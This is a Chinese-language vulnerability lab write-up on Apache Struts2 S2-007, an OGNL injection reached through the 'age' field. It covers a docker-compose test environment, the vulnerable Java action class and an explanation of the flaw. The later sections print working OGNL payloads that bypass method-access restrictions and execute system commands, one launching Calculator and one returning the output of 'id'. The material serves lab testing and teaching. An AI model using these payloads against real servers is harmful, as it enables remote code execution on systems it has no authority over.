# S2-007 远程代码执行漏洞

影响版本: 2.0.0 - 2.2.3
漏洞详情: http://struts.apache.org/docs/s2-007.html

## 测试环境搭建

```
docker-compose build
docker-compose up -d
```

## 原理

在处理类型转换的错误时会存入错误到内存中，在后续调用流程中触发OGNL表达式注入，**无需编写`<ActionName> -validation.xml`**。

```java
import com.opensymphony.xwork2.ActionSupport;

public class LoginAction extends ActionSupport {
    private String username;
    private String password;
    private int age;

    public String getUsername() {
        return username;
    }

    public String getPassword() {
        return password;
    }

    public int getAge() {
        return age;
    }

    public void setUsername(String username) {
        this.username = username;
    }

    public void setPassword(String password) {
        this.password = password;
    }

    public void setAge(int age) {
        this.age = age;
    }

    public String execute() throws Exception{
        if (this.username == null || this.password == null) {
            return "failed";
        }

        if (this.username.equals("admin") && this.password.equals("admin")) {
            return "success";
        }

        return "failed";
    }
}
```

当用户提交 age 为字符串而非整形数值时，后端用代码拼接 `"'" + value + "'"` 然后对其进行 OGNL 表达式解析。

测试POC：
```
'+(#application)+'
```

因为受影响版本为 Struts2 2.0.0 - Struts2 2.2.3，所以这里给出绕过安全配置进行命令执行的 Payload（**弹计算器，无法在本项目环境下运行**）：

```
' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@java.lang.Runtime@getRuntime().exec("open /Applications/Calculator.app")) + '
```

## Setup

```
docker-compose build
docker-compose up -d
```

访问 `<host>:8080`并在age处设置你的payload。

## Exploit

@rickgray 在原文中只给了弹计算器的POC，我给出执行任意代码的EXP：

```
' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())) + '
```

将Exp传入可以利用的输入框（age），得到命令执行结果：

![](1.jpeg)